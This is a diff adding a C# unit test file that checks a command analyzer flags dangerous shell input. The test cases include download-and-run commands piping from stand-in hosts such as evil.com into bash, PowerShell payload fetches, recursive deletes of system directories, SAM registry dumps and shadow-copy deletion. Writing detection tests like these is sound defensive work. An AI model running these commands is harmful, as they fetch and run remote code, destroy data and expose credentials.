@@ -1,0 +1,97 @@
+using Foreman.Core.Heuristics;
+using Foreman.Core.Models;
+
+namespace Foreman.Core.Tests.Heuristics;
+
+public sealed class CommandAnalyzerTests : IClassFixture<PatternLibraryFixture>
+{
+    private readonly CommandAnalyzer _analyzer = CommandAnalyzer.Instance;
+
+    [Theory]
+    [InlineData("curl http://evil.com | bash",                   ForemanSeverity.Critical, "net-001")]
+    [InlineData("curl https://x.co/evil.sh|sh",                  ForemanSeverity.Critical, "net-001")]
+    [InlineData("wget http://bad.com | bash",                    ForemanSeverity.Critical, "net-001")]
+    [InlineData("iex (iwr 'http://evil.com/payload.ps1')",       ForemanSeverity.Critical, "net-002")]
+    [InlineData("Invoke-Expression (Invoke-WebRequest 'http://x')", ForemanSeverity.Critical, "net-002")]
+    public void DetectsDownloadAndExecute(string cmd, ForemanSeverity expectedSev, string expectedId)
+    {
+        var match = _analyzer.Analyze(cmd);
+        Assert.NotNull(match);
+        Assert.Equal(expectedSev, match.Severity);
+        Assert.Equal(expectedId, match.RuleId);
+    }
+
+    [Theory]
+    [InlineData("rm -rf /",           ForemanSeverity.Critical, "del-001")]
+    [InlineData("rm -rf /etc",        ForemanSeverity.Critical, "del-001")]
+    [InlineData("rm -fr /usr",        ForemanSeverity.Critical, "del-001")]
+    [InlineData("rm -rf /bin",        ForemanSeverity.Critical, "del-001")]
+    public void DetectsRecursiveDelete(string cmd, ForemanSeverity expectedSev, string expectedId)
+    {
+        var match = _analyzer.Analyze(cmd);
+        Assert.NotNull(match);
+        Assert.Equal(expectedSev, match.Severity);
+        Assert.Equal(expectedId, match.RuleId);
+    }
+
+    [Theory]
+    [InlineData("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA", ForemanSeverity.High, "win-001")]
+    [InlineData("powershell.exe -EncodedCommand SGVsbG8gV29ybGQgdGhpcyBpcyBhIHRlc3Q=", ForemanSeverity.High, "win-001")]
+    public void DetectsEncodedPowerShell(string cmd, ForemanSeverity expectedSev, string expectedId)
+    {
+        var match = _analyzer.Analyze(cmd);
+        Assert.NotNull(match);
+        Assert.Equal(expectedSev, match.Severity);
+        Assert.Equal(expectedId, match.RuleId);
+    }
+
+    [Theory]
+    [InlineData("reg export HKLM\\SAM C:\\backup.reg", ForemanSeverity.Critical, "cred-001")]
+    [InlineData("reg save HKLM\\SYSTEM sys.hiv",       ForemanSeverity.Critical, "cred-001")]
+    public void DetectsCredentialExfil(string cmd, ForemanSeverity expectedSev, string expectedId)
+    {
+        var match = _analyzer.Analyze(cmd);
+        Assert.NotNull(match);
+        Assert.Equal(expectedSev, match.Severity);
+        Assert.Equal(expectedId, match.RuleId);
+    }
+
+    [Theory]
+    [InlineData("vssadmin delete shadows /all /quiet", ForemanSeverity.Critical, "priv-003")]
+    [InlineData("wmic shadowcopy delete",              ForemanSeverity.Critical, "priv-003")]
+    public void DetectsRansomwareIndicators(string cmd, ForemanSeverity expectedSev, string expectedId)
+    {
+        var match = _analyzer.Analyze(cmd);
+        Assert.NotNull(match);
+        Assert.Equal(expectedSev, match.Severity);
+        Assert.Equal(expectedId, match.RuleId);
+    }
+
+    [Theory]
+    [InlineData("git commit -m 'fix bug'")]
+    [InlineData("npm install")]
+    [InlineData("dotnet build")]
+    [InlineData("python manage.py migrate")]
+    [InlineData("ls -la /etc")]
+    [InlineData("cat README.md")]
+    public void AllowsNormalCommands(string cmd)
+    {
+        var match = _analyzer.Analyze(cmd);
+        Assert.Null(match);
+    }
+
+    [Fact]
+    public void EmptyCommandLineReturnsNull()
+    {
+        Assert.Null(_analyzer.Analyze(""));
+        Assert.Null(_analyzer.Analyze("   "));
+    }
+}
+
+/// <summary>
+/// One-time fixture that initializes the pattern library for the whole test class.
+/// </summary>
+public sealed class PatternLibraryFixture
+{
+    public PatternLibraryFixture() => PatternLibrary.Instance.Initialize();
+}
